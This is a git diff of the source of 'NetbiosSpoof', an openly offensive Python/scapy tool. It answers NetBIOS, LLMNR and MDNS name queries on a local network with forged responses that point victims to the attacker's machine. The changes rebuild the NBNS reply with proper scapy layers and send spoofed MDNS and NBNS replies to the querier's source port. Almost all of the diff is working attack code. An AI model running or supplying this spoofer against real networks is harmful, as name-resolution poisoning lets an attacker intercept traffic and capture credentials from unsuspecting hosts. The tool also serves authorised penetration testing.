@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 
 ###################
-#    This package implements a Hostname Spoofer (Netbios, LLMNR and Local DNS).
-#    Copyright (C) 2021  Maurice Lambert
+#    This package implements a Hostname Spoofer (Netbios, LLMNR and MDNS).
+#    Copyright (C) 2021, 2023  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -20,7 +20,7 @@
 ###################
 
 """
-This package implements a Hostname Spoofer (Netbios, LLMNR and Local DNS).
+This package implements a Hostname Spoofer (Netbios, LLMNR and MDNS).
 
 >>> from scapy.all import conf
 >>> spoofer = NetbiosSpoof()
@@ -39,21 +39,22 @@ This package implements a Hostname Spoofer (Netbios, LLMNR and Local DNS).
 [22/06/2022 06:19:32] WARNING  (30) {__main__ - NetbiosSpoof.py:451} The netbios spoofer starts up...
 [22/06/2022 06:19:32] INFO     (20) {__main__ - NetbiosSpoof.py:430} Protocol DNS, spoof b'kali.local.' for 172.17.0.3
 [22/06/2022 06:19:32] CRITICAL (50) {__main__ - NetbiosSpoof.py:470} The netbios spoofer is stopped.
+~# 
 """
 
-__version__ = "1.1.0"
+__version__ = "1.1.2"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
-This package implements a Hostname Spoofer (Netbios, LLMNR and Local DNS).
+This package implements a Hostname Spoofer (Netbios, LLMNR and MDNS).
 """
 license = "GPL-3.0 License"
 __url__ = "https://github.com/mauricelambert/NetbiosSpoof"
 
 copyright = """
-NetbiosSpoof  Copyright (C) 2021  Maurice Lambert
+NetbiosSpoof  Copyright (C) 2021, 2023  Maurice Lambert
 This program comes with ABSOLUTELY NO WARRANTY.
 This is free software, and you are welcome to redistribute it
 under certain conditions.
@@ -64,22 +65,24 @@ __copyright__ = copyright
 __all__ = ["NetbiosSpoof", "main"]
 
 from scapy.all import (
+    NBNSQueryResponse,
     NBNSQueryRequest,
-    LLMNRQuery,
+    NBNS_ADD_ENTRY,
     LLMNRResponse,
-    DNS,
+    AsyncSniffer,
+    LLMNRQuery,
+    NBNSHeader,
+    IFACES,
+    Packet,
     DNSQR,
     DNSRR,
-    Raw,
-    send,
     sniff,
-    IP,
+    send,
     IPv6,
-    UDP,
-    Packet,
-    IFACES,
-    AsyncSniffer,
     conf,
+    DNS,
+    UDP,
+    IP,
 )
 from logging import StreamHandler, Formatter, Logger, getLogger, DEBUG, WARNING
 from argparse import ArgumentParser, Namespace
@@ -119,7 +122,6 @@ class ScapyArguments(ArgumentParser):
     def parse_args(
         self, args: List[str] = None, namespace: Namespace = None
     ) -> Namespace:
-
         """
         This function implements the iface
         research from interface arguments.
@@ -139,7 +141,6 @@ class ScapyArguments(ArgumentParser):
             interface = interface.casefold()
 
             for temp_iface in IFACES.values():
-
                 ip = temp_iface.ip
                 mac = temp_iface.mac or ""
                 name = temp_iface.name or ""
@@ -163,7 +164,6 @@ class ScapyArguments(ArgumentParser):
 
 
 def get_custom_logger() -> Logger:
-
     """
     This function create a custom logger.
     """
@@ -210,27 +210,25 @@ class NetbiosSpoof:
         )
 
     def craft_NBNS_response(self, packet: Packet) -> Packet:
-
         """
         This function crafts the Netbios response.
         """
 
         source = packet[IP].src
         query = packet[NBNSQueryRequest]
+        netbios_header = packet[NBNSHeader]
         name = query.QUESTION_NAME
 
         return (
             [
                 IP(ihl=5, proto=17, dst=source)
-                / UDP(sport=137, dport=137)
-                / NBNSQueryRequest(
-                    NAME_TRN_ID=query.NAME_TRN_ID,
-                    FLAGS=34048,
-                    QDCOUNT=0,
-                    ANCOUNT=1,
-                    QUESTION_NAME=name,
+                / UDP(sport=137, dport=packet[UDP].sport)
+                / NBNSHeader(NAME_TRN_ID=netbios_header.NAME_TRN_ID)
+                / NBNSQueryResponse(
+                    ADDR_ENTRY=[NBNS_ADD_ENTRY(NB_ADDRESS=self.ip)],
+                    RR_NAME=name,
+                    QUESTION_TYPE=32,
                 )
-                / Raw(load=b"\x00\x04\x93\xe0\x00\x06\x00\x00" + self.raw_ip)
             ],
             source,
             name,
@@ -238,7 +236,6 @@ class NetbiosSpoof:
         )
 
     def craft_LLMNR_IP_type_28(self, packet: Packet) -> Packet:
-
         """
         This function craft an IP-LLMNR packet, type 28.
         """
@@ -264,7 +261,6 @@ class NetbiosSpoof:
         )
 
     def craft_LLMNR_IP(self, packet: Packet) -> Packet:
-
         """
         This function craft an IP-LLMNR packet.
         """
@@ -290,7 +286,6 @@ class NetbiosSpoof:
         )
 
     def craft_LLMNR_IPv6_type_28(self, packet: Packet) -> Packet:
-
         """
         This function craft an IPv6-LLMNR packet, type 28.
         """
@@ -316,7 +311,6 @@ class NetbiosSpoof:
         )
 
     def craft_LLMNR_IPv6(self, packet: Packet) -> Packet:
-
         """
         This function craft an IPv6-LLMNR packet.
         """
@@ -342,7 +336,6 @@ class NetbiosSpoof:
         )
 
     def detect_LLMNR_type(self, packet: Packet) -> Packet:
-
         """
         This function detects the IP version and DNSQR
         type to forge the LLMNR response.
@@ -361,7 +354,6 @@ class NetbiosSpoof:
                 return self.craft_LLMNR_IPv6(packet)
 
     def craft_MDNS_IP(self, packet: Packet) -> Packet:
-
         """
         This function crafts a MDNS-IP packet.
         """
@@ -372,7 +364,7 @@ class NetbiosSpoof:
         return (
             [
                 IP(ihl=5, proto=17, dst=multicast_v4)
-                / UDP(sport=5353, dport=5353)
+                / UDP(sport=5353, dport=packet[UDP].sport)
                 / DNS(
                     qr=1,
                     aa=1,
@@ -396,7 +388,6 @@ class NetbiosSpoof:
         )
 
     def craft_DNSv6_response(self, name: str) -> Packet:
-
         """
         This function crafts a IPv6-DNS response.
         """
@@ -421,7 +412,6 @@ class NetbiosSpoof:
             return response
 
     def craft_MDNS_IPv6(self, packet: Packet) -> Packet:
-
         """
         This function crafts a MDNS-IPv6 packet.
         """
@@ -431,7 +421,7 @@ class NetbiosSpoof:
         return (
             [
                 IPv6(dst=self.multicast_v6)
-                / UDP(sport=5353, dport=5353)
+                / UDP(sport=5353, dport=packet[UDP].sport)
                 / DNS(
                     qr=1,
                     aa=1,
@@ -455,7 +445,6 @@ class NetbiosSpoof:
         )
 
     def detect_ip_version_DNS(self, packet: Packet) -> Packet:
-
         """
         This function crafts the DNS response.
         """
@@ -467,7 +456,6 @@ class NetbiosSpoof:
             return self.craft_MDNS_IPv6(packet)
 
     def identify_packet(self, packet: Packet) -> None:
-
         """
         This function detects the request type and send the response.
         """
@@ -489,7 +477,6 @@ class NetbiosSpoof:
         logger_info(f"Protocol {style}, spoof {name} for {ip_src}")
 
     def stop(self) -> None:
-
         """
         This function stops the netbios spoofer (and the network sniffer).
         """
@@ -503,7 +490,6 @@ class NetbiosSpoof:
         logger_info("Spoofer/Sniffer stops... Please wait a moment...")
 
     def start(self, asynchronous: bool = False) -> None:
-
         """
         This function starts the netbios spoofer (and the network sniffer).
         """
@@ -532,7 +518,6 @@ class NetbiosSpoof:
 
 
 def main() -> int:
-
     """
     This function starts the netbios spoofer from the command line.
     """
